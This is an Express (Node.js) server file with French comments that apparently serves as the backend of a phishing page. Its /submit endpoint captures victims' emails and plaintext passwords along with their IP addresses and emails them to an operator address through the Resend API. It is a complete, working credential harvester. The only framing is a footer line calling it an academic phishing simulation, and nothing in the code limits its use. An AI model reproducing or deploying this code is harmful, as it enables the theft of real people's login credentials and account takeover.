require('dotenv').config();
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint de capture
app.post('/submit', async (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  console.log(`[${timestamp}] Identifiants capturés - Email: ${email}`);

  try {
    const response = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${process.env.RESEND_API_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        from: 'Phishing Alert <onboarding@resend.dev>',
        to: process.env.EMAIL_TO,
        subject: `[PHISHING] Identifiants capturés - ${email}`,
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px;">
            <h2 style="color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px;">
              Identifiants capturés
            </h2>
            <table style="width: 100%; border-collapse: collapse; margin-top: 16px;">
              <tr>
                <td style="padding: 10px; font-weight: bold; color: #555; border-bottom: 1px solid #eee;">Email</td>
                <td style="padding: 10px; border-bottom: 1px solid #eee;">${email}</td>
              </tr>
              <tr>
                <td style="padding: 10px; font-weight: bold; color: #555; border-bottom: 1px solid #eee;">Mot de passe</td>
                <td style="padding: 10px; border-bottom: 1px solid #eee;">${password}</td>
              </tr>
              <tr>
                <td style="padding: 10px; font-weight: bold; color: #555; border-bottom: 1px solid #eee;">IP</td>
                <td style="padding: 10px; border-bottom: 1px solid #eee;">${ip}</td>
              </tr>
              <tr>
                <td style="padding: 10px; font-weight: bold; color: #555;">Date</td>
                <td style="padding: 10px;">${timestamp}</td>
              </tr>
            </table>
            <p style="margin-top: 20px; font-size: 12px; color: #999;">
              Simulation de phishing - Projet académique
            </p>
          </div>
        `
      })
    });

    if (response.ok) {
      console.log(`[${timestamp}] Email envoyé`);
    } else {
      const error = await response.json();
      console.error('Erreur envoi email:', error.message);
    }
  } catch (error) {
    console.error('Erreur envoi email:', error.message);
  }

  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(`\n  Serveur phishing démarré sur http://localhost:${PORT}\n`);
});
